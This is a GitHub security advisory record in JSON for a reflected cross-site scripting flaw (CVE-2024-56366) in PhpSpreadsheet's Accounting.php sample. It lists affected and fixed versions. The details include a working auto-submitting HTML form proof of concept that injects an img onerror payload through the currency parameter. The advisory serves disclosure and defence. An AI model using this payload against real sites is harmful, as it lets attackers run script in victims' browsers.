{
	"schema_version": "1.6.0",
	"id": "GHSA-c6fv-7vh8-2rhr",
	"modified": "2025-01-03T19:29:31.141904Z",
	"published": "2025-01-03T17:06:23Z",
	"aliases": [
		"CVE-2024-56366"
	],
	"summary": "PhpSpreadsheet allows unauthorized Reflected XSS in the Accounting.php file",
	"details": "# Unauthorized Reflected XSS in the `Accounting.php` file\n\n**Product**: Phpspreadsheet\n**Version**: version 3.6.0\n**CWE-ID**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n**CVSS vector v.3.1**: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)\n**CVSS vector v.4.0**: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)\n**Description**: using the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` script, an attacker can perform a XSS-type attack\n**Impact**: executing arbitrary JavaScript code in the browser\n**Vulnerable component**: the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` file\n**Exploitation conditions**: an unauthorized user\n**Mitigation**: sanitization of the currency variable\n**Researcher**: Aleksey Solovev (Positive Technologies)\n\n# Research\n\nThe researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in `Accounting.php` file) in Phpspreadsheet.\n\nThere is no sanitization in the `/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php` file, which leads to the possibility of a XSS attack.\nStrings are formed using the currency parameter without sanitization, which is controlled by the attacker.\n\n![fig7](https://github.com/user-attachments/assets/da0ee52d-2306-4770-a61d-bce4ba553f4f)\n\n*Figure 7. A fragment of the query in which a string and a parameter are formed without sanitization*\n\nAn attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.\n\n*Listing 4. HTML form that demonstrates the exploitation of the XSS vulnerability*\n\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Accounting.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"number\" value=\"1234&#46;5678\" />\n      <input type=\"hidden\" name=\"currency\" value=\"&#36;&lt;img&#32;src&#61;1&#32;onerror&#61;alert&#40;&#41;&gt;\" />\n      <input type=\"hidden\" name=\"decimals\" value=\"2\" />\n      <input type=\"hidden\" name=\"position\" value=\"1\" />\n      <input type=\"hidden\" name=\"spacing\" value=\"0\" />\n      <input type=\"hidden\" name=\"submit\" value=\"Display&#32;Mask\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n\nAfter sending the script provided in Listing 4, the XSS vulnerability is exploited. Figure 8 shows the execution of arbitrary JavaScript code during the submission of a POST form.\n\n<img width=\"460\" alt=\"fig8\" src=\"https://github.com/user-attachments/assets/b009256e-61f7-4d72-8f6a-cc6e0efe2bb1\" />\n\n*Figure 8. Executing arbitrary JavaScript code*\n\n# Credit\nThis vulnerability was discovered by **Aleksey Solovev (Positive Technologies)**",
	"severity": [
		{
			"type": "CVSS_V3",
			"score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N"
		},
		{
			"type": "CVSS_V4",
			"score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L"
		}
	],
	"affected": [
		{
			"package": {
				"ecosystem": "Packagist",
				"name": "phpoffice/phpspreadsheet",
				"purl": "pkg:composer/phpoffice/phpspreadsheet"
			},
			"ranges": [
				{
					"type": "ECOSYSTEM",
					"events": [
						{
							"introduced": "3.0.0"
						},
						{
							"fixed": "3.7.0"
						}
					]
				}
			],
			"versions": [
				"3.3.0",
				"3.4.0",
				"3.5.0",
				"3.6.0"
			],
			"database_specific": {
				"source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-c6fv-7vh8-2rhr/GHSA-c6fv-7vh8-2rhr.json"
			}
		},
		{
			"package": {
				"ecosystem": "Packagist",
				"name": "phpoffice/phpspreadsheet",
				"purl": "pkg:composer/phpoffice/phpspreadsheet"
			},
			"ranges": [
				{
					"type": "ECOSYSTEM",
					"events": [
						{
							"introduced": "0"
						},
						{
							"fixed": "1.29.7"
						}
					]
				}
			],
			"versions": [
				"1.0.0",
				"1.0.0-beta",
				"1.0.0-beta2",
				"1.1.0",
				"1.10.0",
				"1.10.1",
				"1.11.0",
				"1.12.0",
				"1.13.0",
				"1.14.0",
				"1.14.1",
				"1.15.0",
				"1.16.0",
				"1.17.0",
				"1.17.1",
				"1.18.0",
				"1.19.0",
				"1.2.0",
				"1.2.1",
				"1.20.0",
				"1.21.0",
				"1.22.0",
				"1.23.0",
				"1.24.0",
				"1.24.1",
				"1.25.0",
				"1.25.1",
				"1.25.2",
				"1.26.0",
				"1.27.0",
				"1.27.1",
				"1.28.0",
				"1.29.0",
				"1.29.1",
				"1.29.2",
				"1.29.4",
				"1.29.5",
				"1.29.6",
				"1.3.0",
				"1.3.1",
				"1.4.0",
				"1.4.1",
				"1.5.0",
				"1.5.1",
				"1.5.2",
				"1.6.0",
				"1.7.0",
				"1.8.0",
				"1.8.1",
				"1.8.2",
				"1.9.0"
			],
			"database_specific": {
				"last_known_affected_version_range": "<= 1.29.6",
				"source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-c6fv-7vh8-2rhr/GHSA-c6fv-7vh8-2rhr.json"
			}
		},
		{
			"package": {
				"ecosystem": "Packagist",
				"name": "phpoffice/phpspreadsheet",
				"purl": "pkg:composer/phpoffice/phpspreadsheet"
			},
			"ranges": [
				{
					"type": "ECOSYSTEM",
					"events": [
						{
							"introduced": "2.0.0"
						},
						{
							"fixed": "2.1.6"
						}
					]
				}
			],
			"versions": [
				"2.0.0",
				"2.1.0",
				"2.1.1",
				"2.1.3",
				"2.1.4",
				"2.1.5"
			],
			"database_specific": {
				"last_known_affected_version_range": "<= 2.1.5",
				"source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-c6fv-7vh8-2rhr/GHSA-c6fv-7vh8-2rhr.json"
			}
		},
		{
			"package": {
				"ecosystem": "Packagist",
				"name": "phpoffice/phpspreadsheet",
				"purl": "pkg:composer/phpoffice/phpspreadsheet"
			},
			"ranges": [
				{
					"type": "ECOSYSTEM",
					"events": [
						{
							"introduced": "2.2.0"
						},
						{
							"fixed": "2.3.5"
						}
					]
				}
			],
			"versions": [
				"2.2.0",
				"2.2.1",
				"2.2.2",
				"2.3.0",
				"2.3.2",
				"2.3.3",
				"2.3.4"
			],
			"database_specific": {
				"last_known_affected_version_range": "<= 2.3.4",
				"source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/01/GHSA-c6fv-7vh8-2rhr/GHSA-c6fv-7vh8-2rhr.json"
			}
		}
	],
	"references": [
		{
			"type": "WEB",
			"url": "https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-c6fv-7vh8-2rhr"
		},
		{
			"type": "ADVISORY",
			"url": "https://nvd.nist.gov/vuln/detail/CVE-2024-56366"
		},
		{
			"type": "WEB",
			"url": "https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4"
		},
		{
			"type": "PACKAGE",
			"url": "https://github.com/PHPOffice/PhpSpreadsheet"
		}
	],
	"database_specific": {
		"cwe_ids": [
			"CWE-79"
		],
		"github_reviewed": true,
		"github_reviewed_at": "2025-01-03T17:06:23Z",
		"nvd_published_at": "2025-01-03T17:15:08Z",
		"severity": "HIGH"
	}
}
